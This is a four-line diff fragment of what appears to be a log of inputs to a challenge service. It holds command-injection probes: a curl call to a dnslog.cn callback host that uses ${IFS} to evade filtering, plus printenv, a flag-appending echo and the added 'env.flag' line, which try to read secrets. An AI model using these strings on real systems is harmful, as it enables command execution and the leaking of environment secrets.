@@ -678,3 +678,4 @@ lcl-367:curl${IFS}fkssbb.sxhx72.dnslog.cn
 XXCNMOOO:asd}}"
 echo "$user:$flag" >> issues
 XXCNMOOO:printenv
+XXCNMOOO:env.flag
